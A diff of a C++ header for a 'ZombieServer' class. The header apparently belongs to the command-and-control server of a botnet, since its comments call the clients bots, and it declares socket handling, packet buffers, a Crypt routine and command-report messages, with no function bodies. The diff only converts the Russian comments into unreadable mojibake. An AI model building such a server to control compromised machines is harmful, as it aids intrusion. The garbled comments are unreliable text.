@@ -1,12 +1,12 @@
 #pragma once
 
-#define PORT 666							// Порт для подключения клиентов
-#define MAX_CLIENT 20						// Максимальное число подключенных клиентов
-#define PACKET_SIZE	4112					// Размер сообщения, которым обмениваются сервер и клиент
-#define PACKET_DATA_SIZE 4096				// Размер данных в пакете
-#define SEND_BUFFER_SIZE PACKET_SIZE * 10	// Размер буффера для отправки данных клиенту
+#define PORT 666							// РџРѕСЂС‚ РґР»СЏ РїРѕРґРєР»СЋС‡РµРЅРёСЏ РєР»РёРµРЅС‚РѕРІ
+#define MAX_CLIENT 20						// РњР°РєСЃРёРјР°Р»СЊРЅРѕРµ С‡РёСЃР»Рѕ РїРѕРґРєР»СЋС‡РµРЅРЅС‹С… РєР»РёРµРЅС‚РѕРІ
+#define PACKET_SIZE	4112					// Р Р°Р·РјРµСЂ СЃРѕРѕР±С‰РµРЅРёСЏ, РєРѕС‚РѕСЂС‹Рј РѕР±РјРµРЅРёРІР°СЋС‚СЃСЏ СЃРµСЂРІРµСЂ Рё РєР»РёРµРЅС‚
+#define PACKET_DATA_SIZE 4096				// Р Р°Р·РјРµСЂ РґР°РЅРЅС‹С… РІ РїР°РєРµС‚Рµ
+#define SEND_BUFFER_SIZE PACKET_SIZE * 10	// Р Р°Р·РјРµСЂ Р±СѓС„С„РµСЂР° РґР»СЏ РѕС‚РїСЂР°РІРєРё РґР°РЅРЅС‹С… РєР»РёРµРЅС‚Сѓ
 
-// Сообщения сервера, которые должно обрабатывать окно
+// РЎРѕРѕР±С‰РµРЅРёСЏ СЃРµСЂРІРµСЂР°, РєРѕС‚РѕСЂС‹Рµ РґРѕР»Р¶РЅРѕ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊ РѕРєРЅРѕ
 #define WM_JOINED_CLIENT	WM_USER+1
 #define WM_CLOSE_CLIENT		WM_USER+2
 #define WM_CMD_REPORT		WM_USER+3
@@ -40,15 +40,15 @@ class ZombieServer
 {
 public:
 	ZombieServer();
-	BOOL StartServer(HWND hWnd);							// Стартует сервер и прицепляет события сервера к окну
-	BOOL SendPacket(int id, Packet* packet);				// Отсылает сообщение
+	BOOL StartServer(HWND hWnd);							// РЎС‚Р°СЂС‚СѓРµС‚ СЃРµСЂРІРµСЂ Рё РїСЂРёС†РµРїР»СЏРµС‚ СЃРѕР±С‹С‚РёСЏ СЃРµСЂРІРµСЂР° Рє РѕРєРЅСѓ
+	BOOL SendPacket(int id, Packet* packet);				// РћС‚СЃС‹Р»Р°РµС‚ СЃРѕРѕР±С‰РµРЅРёРµ
 
 private:
-	static DWORD WINAPI ThreadEvents(LPVOID lpParameter);	// Поток обработки событий сервера
-	BOOL AcceptClient(DWORD index);							// Подключает нового клиента
-	BOOL WriteClient(DWORD index);							// Отправляет данные из временного буффера
-	BOOL ReadClient(DWORD index);							// Читает пришедшее сообщение									
-	void CloseClient(DWORD index);							// Закрывает соединение с клиентом (возвращает ID отсоединившегося клиента)
+	static DWORD WINAPI ThreadEvents(LPVOID lpParameter);	// РџРѕС‚РѕРє РѕР±СЂР°Р±РѕС‚РєРё СЃРѕР±С‹С‚РёР№ СЃРµСЂРІРµСЂР°
+	BOOL AcceptClient(DWORD index);							// РџРѕРґРєР»СЋС‡Р°РµС‚ РЅРѕРІРѕРіРѕ РєР»РёРµРЅС‚Р°
+	BOOL WriteClient(DWORD index);							// РћС‚РїСЂР°РІР»СЏРµС‚ РґР°РЅРЅС‹Рµ РёР· РІСЂРµРјРµРЅРЅРѕРіРѕ Р±СѓС„С„РµСЂР°
+	BOOL ReadClient(DWORD index);							// Р§РёС‚Р°РµС‚ РїСЂРёС€РµРґС€РµРµ СЃРѕРѕР±С‰РµРЅРёРµ									
+	void CloseClient(DWORD index);							// Р—Р°РєСЂС‹РІР°РµС‚ СЃРѕРµРґРёРЅРµРЅРёРµ СЃ РєР»РёРµРЅС‚РѕРј (РІРѕР·РІСЂР°С‰Р°РµС‚ ID РѕС‚СЃРѕРµРґРёРЅРёРІС€РµРіРѕСЃСЏ РєР»РёРµРЅС‚Р°)
 	void WorkData(Packet* pak);
 	void  ParseUser(char*, User*);
 	void Crypt(char* cryptData, int sizeCryptData);
@@ -57,23 +57,23 @@ private:
 	DWORD ParseID1(char* data);
 	DWORD ParseID2(char* data);
 
-	HWND hWnd;												// Хендл окна, которому необходимо передавать сообщения
+	HWND hWnd;												// РҐРµРЅРґР» РѕРєРЅР°, РєРѕС‚РѕСЂРѕРјСѓ РЅРµРѕР±С…РѕРґРёРјРѕ РїРµСЂРµРґР°РІР°С‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ
 
-	int GetID(DWORD index);	// Возвращает ID бота
+	int GetID(DWORD index);	// Р’РѕР·РІСЂР°С‰Р°РµС‚ ID Р±РѕС‚Р°
 	SOCKET client_socket[MAX_CLIENT + 1];
 	WSAEVENT client_event[MAX_CLIENT + 1];
 	int eventTotal;
 
-	// Клиентские данные
-	BOOL writeAccess[MAX_CLIENT + 1];				// Индикатор доступа к записи в сокет
-	char recvBuffer[MAX_CLIENT + 1][PACKET_SIZE];	// Буфер для приема данных
-	char* writeBuffer[MAX_CLIENT + 1];				// Указатель на временный буфер отправляемый данных
-	int sizeWriteBuffer[MAX_CLIENT + 1];			// Размер временного буфера отправляемых данных (может приращиваться)
-	int id[MAX_CLIENT + 1];							// id клиента
-	int numRecv[MAX_CLIENT + 1];					// Число байт в буфере принятых данных
-	int numSend[MAX_CLIENT + 1];					// Число уже записанных байт во временном буфере отправляемых данных (writeBuffer)
+	// РљР»РёРµРЅС‚СЃРєРёРµ РґР°РЅРЅС‹Рµ
+	BOOL writeAccess[MAX_CLIENT + 1];				// РРЅРґРёРєР°С‚РѕСЂ РґРѕСЃС‚СѓРїР° Рє Р·Р°РїРёСЃРё РІ СЃРѕРєРµС‚
+	char recvBuffer[MAX_CLIENT + 1][PACKET_SIZE];	// Р‘СѓС„РµСЂ РґР»СЏ РїСЂРёРµРјР° РґР°РЅРЅС‹С…
+	char* writeBuffer[MAX_CLIENT + 1];				// РЈРєР°Р·Р°С‚РµР»СЊ РЅР° РІСЂРµРјРµРЅРЅС‹Р№ Р±СѓС„РµСЂ РѕС‚РїСЂР°РІР»СЏРµРјС‹Р№ РґР°РЅРЅС‹С…
+	int sizeWriteBuffer[MAX_CLIENT + 1];			// Р Р°Р·РјРµСЂ РІСЂРµРјРµРЅРЅРѕРіРѕ Р±СѓС„РµСЂР° РѕС‚РїСЂР°РІР»СЏРµРјС‹С… РґР°РЅРЅС‹С… (РјРѕР¶РµС‚ РїСЂРёСЂР°С‰РёРІР°С‚СЊСЃСЏ)
+	int id[MAX_CLIENT + 1];							// id РєР»РёРµРЅС‚Р°
+	int numRecv[MAX_CLIENT + 1];					// Р§РёСЃР»Рѕ Р±Р°Р№С‚ РІ Р±СѓС„РµСЂРµ РїСЂРёРЅСЏС‚С‹С… РґР°РЅРЅС‹С…
+	int numSend[MAX_CLIENT + 1];					// Р§РёСЃР»Рѕ СѓР¶Рµ Р·Р°РїРёСЃР°РЅРЅС‹С… Р±Р°Р№С‚ РІРѕ РІСЂРµРјРµРЅРЅРѕРј Р±СѓС„РµСЂРµ РѕС‚РїСЂР°РІР»СЏРµРјС‹С… РґР°РЅРЅС‹С… (writeBuffer)
 
-													// Уникальный ID назначаемый сервером клиенту
+													// РЈРЅРёРєР°Р»СЊРЅС‹Р№ ID РЅР°Р·РЅР°С‡Р°РµРјС‹Р№ СЃРµСЂРІРµСЂРѕРј РєР»РёРµРЅС‚Сѓ
 	int unicID;
 };
 
